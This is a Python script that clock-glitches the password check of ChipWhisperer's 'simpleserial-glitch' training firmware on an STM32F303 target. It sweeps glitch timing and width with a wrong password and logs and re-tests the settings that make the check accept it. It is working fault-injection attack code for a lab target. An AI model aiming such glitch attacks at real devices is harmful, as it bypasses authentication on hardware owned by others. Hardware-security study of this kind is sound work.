#!/usr/bin/env python3
"""
Clock-glitch the password() check in simpleserial-glitch.c on CW-Lite + STM32F303.

Steps:
  1. Build the firmware by running program.sh.
  2. Flash simpleserial-glitch-CWLITEARM.hex to the target.
  3. Sanity-check the target with a correct and a wrong password.
  4. Sweep ext_offset x width x offset with a WRONG password, looking for
     attempts where the target reports the password as accepted.

The target loop is:

    char passok = 1;
    for (cnt = 0; cnt < 5; cnt++)
        if (pw[cnt] != passwd[cnt]) passok = 0;

so passok starts ACCEPTED and is cleared on mismatch. A successful glitch
must stop that clear from happening -- by skipping the store, skipping the
compare, or breaking out of the loop early. Unlike glitch_loop, the
interesting window is only ~50 cycles long, so ext_offset must be swept.

Usage:
    python3 run_password_glitch.py --fw-dir /path/to/simpleserial-glitch
    python3 run_password_glitch.py --skip-build --password Xouch --ext-max 60
    python3 run_password_glitch.py --skip-build --skip-flash --verify-top 5
    python3 run_password_glitch.py --skip-build --skip-flash \
    --password Xouch \
    --ext-min 20 --ext-max 45 --ext-step 1 \
    --width-min -1.953 --width-max -1.953 --width-step 1 \
    --offset-min 48.047 --offset-max 48.047 --offset-step 1 \
    --attempts 50
"""

import argparse
import csv
import os
import subprocess
import sys
import time
from collections import Counter, defaultdict

import chipwhisperer as cw

CORRECT_PW = b"touch"
PASSOK_ACCEPTED = 1
PASSOK_REJECTED = 0


# --------------------------------------------------------------------------
# Build and flash
# --------------------------------------------------------------------------

def build_firmware(fw_dir):
    script = os.path.join(fw_dir, "program.sh")
    if not os.path.isfile(script):
        sys.exit(f"program.sh not found in {fw_dir}")

    print(f"[build] running program.sh in {fw_dir}")
    r = subprocess.run(["bash", "program.sh"], cwd=fw_dir,
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    lines = r.stdout.splitlines()
    if r.returncode != 0:
        print("\n".join(lines))
        sys.exit(f"[build] FAILED with exit code {r.returncode}")
    print("\n".join(lines[-12:]))
    print("[build] ok")


def connect_and_flash(fw_dir, hex_name, skip_flash=False):
    scope = cw.scope()
    scope.default_setup()
    target = cw.target(scope, cw.targets.SimpleSerial2)

    if not skip_flash:
        hex_path = os.path.join(fw_dir, hex_name)
        if not os.path.isfile(hex_path):
            scope.dis()
            sys.exit(f"hex not found: {hex_path}")
        print(f"[flash] programming {hex_path}")
        cw.program_target(scope, cw.programmers.STM32FProgrammer, hex_path)
        print("[flash] ok")

    return scope, target


def reset_target(scope, settle=0.05):
    scope.io.nrst = "low"
    time.sleep(settle)
    scope.io.nrst = "high_z"
    time.sleep(settle)


# --------------------------------------------------------------------------
# One attempt
# --------------------------------------------------------------------------

def send_password(target, cmd, pw, timeout_ms=50):
    """Send a password, return the raw passok byte, or None if no response."""
    target.flush()
    target.simpleserial_write(cmd, bytearray(pw))
    resp = target.simpleserial_read("r", 1, timeout=timeout_ms, ack=False)
    return None if resp is None else resp[0]


def try_glitch(scope, target, cmd, pw, timeout_ms=50):
    """Fire one glitch during the password check. Returns (result, passok)."""
    target.flush()
    scope.arm()

    target.simpleserial_write(cmd, bytearray(pw))

    if scope.capture():                       # True == trigger never fired
        return "no_trigger", None

    resp = target.simpleserial_read("r", 1, timeout=timeout_ms, ack=False)
    if resp is None:
        return "reset", None

    passok = resp[0]
    if passok == PASSOK_REJECTED:
        return "normal", passok
    if passok == PASSOK_ACCEPTED:
        return "success", passok
    return "other", passok                    # passok corrupted to something else


# --------------------------------------------------------------------------
# Baseline
# --------------------------------------------------------------------------

def baseline_check(scope, target, cmd, wrong_pw):
    """Confirm the target answers correctly with no glitching. Abort if not."""
    print("[baseline] checking target with glitching disabled")
    scope.io.hs2 = "clkgen"                   # no glitch output on HS2
    reset_target(scope)

    ok = send_password(target, cmd, CORRECT_PW)
    bad = send_password(target, cmd, wrong_pw)

    print(f"[baseline] correct {CORRECT_PW!r} -> passok={ok}")
    print(f"[baseline] wrong   {bytes(wrong_pw)!r} -> passok={bad}")

    if ok != PASSOK_ACCEPTED or bad != PASSOK_REJECTED:
        sys.exit("[baseline] FAILED -- check the build, the --cmd byte, and "
                 "that password() is registered with a 5-byte length.")
    print("[baseline] ok\n")


# --------------------------------------------------------------------------
# Sweep
# --------------------------------------------------------------------------

def frange(lo, hi, step):
    vals, v = [], lo
    while v <= hi + 1e-9:
        vals.append(round(v, 4))
        v += step
    return vals


def configure_glitch(scope, repeat):
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"
    scope.glitch.trigger_src = "ext_single"
    scope.glitch.repeat = repeat
    scope.io.hs2 = "glitch"


def sweep(scope, target, args, wrong_pw, writer):
    tally = Counter()
    hits = []
    by_ext = defaultdict(int)

    ext_offsets = list(range(args.ext_min, args.ext_max + 1, args.ext_step))
    widths = frange(args.width_min, args.width_max, args.width_step)
    offsets = frange(args.offset_min, args.offset_max, args.offset_step)

    total = len(ext_offsets) * len(widths) * len(offsets) * args.attempts
    print(f"[sweep] {len(ext_offsets)} ext_offsets x {len(widths)} widths "
          f"x {len(offsets)} offsets x {args.attempts} = {total} attempts")

    done = 0
    reset_target(scope)

    for ext in ext_offsets:
        scope.glitch.ext_offset = ext
        for width in widths:
            scope.glitch.width = width
            for offset in offsets:
                scope.glitch.offset = offset

                w_act = scope.glitch.width
                o_act = scope.glitch.offset

                for attempt in range(args.attempts):
                    result, passok = try_glitch(scope, target, args.cmd, wrong_pw)
                    done += 1

                    writer.writerow({
                        "ext_offset": ext,
                        "width_req": width,
                        "offset_req": offset,
                        "width_actual": round(w_act, 4),
                        "offset_actual": round(o_act, 4),
                        "repeat": scope.glitch.repeat,
                        "attempt": attempt,
                        "result": result,
                        "passok": "" if passok is None else passok,
                    })

                    tally[result] += 1
                    if result == "success":
                        by_ext[ext] += 1
                        hits.append((ext, w_act, o_act))
                        print(f"  ACCEPTED  ext_offset={ext:4d} "
                              f"width={w_act:7.3f} offset={o_act:7.3f}")
                    elif result == "other":
                        print(f"  corrupted ext_offset={ext:4d} "
                              f"width={w_act:7.3f} offset={o_act:7.3f} "
                              f"passok={passok}")

                    if result in ("reset", "no_trigger"):
                        reset_target(scope)

        pct = 100.0 * done / total
        print(f"[sweep] ext_offset={ext:4d} done  {done}/{total} ({pct:5.1f}%)  "
              f"{dict(tally)}")

    return tally, hits, by_ext


# --------------------------------------------------------------------------
# Reporting
# --------------------------------------------------------------------------

def print_ext_histogram(by_ext):
    """Successes per ext_offset. The peaks are the loop iterations."""
    if not by_ext:
        return
    print("\n--- successes by ext_offset ---")
    peak = max(by_ext.values())
    for ext in sorted(by_ext):
        n = by_ext[ext]
        bar = "#" * max(1, int(40 * n / peak))
        print(f"  {ext:4d} | {bar} {n}")
    print("  (each cluster should line up with one iteration of the 5-pass loop)")


def verify_top(scope, target, args, wrong_pw, hits, n_params, trials):
    """Re-run the most productive parameter sets to get a real success rate."""
    if not hits:
        return
    ranked = Counter(hits).most_common(n_params)
    print(f"\n--- re-testing top {len(ranked)} parameter sets, "
          f"{trials} trials each ---")

    for (ext, width, offset), seen in ranked:
        scope.glitch.ext_offset = ext
        scope.glitch.width = width
        scope.glitch.offset = offset

        counts = Counter()
        for _ in range(trials):
            result, _ = try_glitch(scope, target, args.cmd, wrong_pw)
            counts[result] += 1
            if result in ("reset", "no_trigger"):
                reset_target(scope)

        rate = 100.0 * counts["success"] / trials
        print(f"  ext={ext:4d} width={width:7.3f} offset={offset:7.3f}  "
              f"success {counts['success']}/{trials} ({rate:5.1f}%)  "
              f"reset {counts['reset']}  normal {counts['normal']}")


# --------------------------------------------------------------------------

def parse_cmd(s):
    """Accept either a single character ('p') or a numeric literal ('0x01')."""
    s = s.strip()
    if len(s) == 1 and not s.isdigit():
        return s
    return int(s, 0)


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--fw-dir", default=".")
    p.add_argument("--hex-name", default="simpleserial-glitch-CWLITEARM.hex")
    p.add_argument("--out", default="password_glitch_results.csv")

    p.add_argument("--skip-build", action="store_true")
    p.add_argument("--skip-flash", action="store_true")

    p.add_argument("--cmd", type=parse_cmd, default="0x01",
                   help="SimpleSerial command for password(); 0x01 under "
                        "SS_VER_2_1 as shipped, or 'p' if you changed it")
    p.add_argument("--password", default="toucX",
                   help="wrong password to submit, 5 chars "
                        "(default differs from 'touch' in the last byte only)")

    p.add_argument("--repeat", type=int, default=1)
    p.add_argument("--ext-min", type=int, default=0)
    p.add_argument("--ext-max", type=int, default=60)
    p.add_argument("--ext-step", type=int, default=1)
    p.add_argument("--width-min", type=float, default=4)
    p.add_argument("--width-max", type=float, default=48)
    p.add_argument("--width-step", type=float, default=4)
    p.add_argument("--offset-min", type=float, default=-48)
    p.add_argument("--offset-max", type=float, default=48)
    p.add_argument("--offset-step", type=float, default=8)
    p.add_argument("--attempts", type=int, default=1)

    p.add_argument("--verify-top", type=int, default=5,
                   help="re-test this many best parameter sets (0 to skip)")
    p.add_argument("--verify-trials", type=int, default=50)

    args = p.parse_args()

    wrong_pw = args.password.encode()
    if len(wrong_pw) != 5:
        sys.exit("--password must be exactly 5 characters")
    if wrong_pw == CORRECT_PW:
        sys.exit("--password must NOT be the correct password 'touch'")

    fw_dir = os.path.abspath(args.fw_dir)
    if not args.skip_build:
        build_firmware(fw_dir)

    scope, target = connect_and_flash(fw_dir, args.hex_name, args.skip_flash)

    try:
        baseline_check(scope, target, args.cmd, wrong_pw)
        configure_glitch(scope, args.repeat)

        fields = ["ext_offset", "width_req", "offset_req", "width_actual",
                  "offset_actual", "repeat", "attempt", "result", "passok"]

        with open(args.out, "w", newline="") as fh:
            writer = csv.DictWriter(fh, fieldnames=fields)
            writer.writeheader()
            tally, hits, by_ext = sweep(scope, target, args, wrong_pw, writer)

        print("\n===== summary =====")
        grand = sum(tally.values())
        for k in ("normal", "success", "other", "reset", "no_trigger"):
            n = tally.get(k, 0)
            print(f"  {k:<11} {n:6d}  ({100.0 * n / grand:5.2f}%)")
        print(f"  total       {grand:6d}")
        print(f"\nresults written to {args.out}")

        print_ext_histogram(by_ext)

        if hits and args.verify_top:
            verify_top(scope, target, args, wrong_pw,
                       hits, args.verify_top, args.verify_trials)
        elif not hits:
            print("\nNo accepted passwords. Widen --ext-max, drop --width-step "
                  "to 2, or try --attempts 3.")

    finally:
        scope.dis()
        target.dis()


if __name__ == "__main__":
    main()
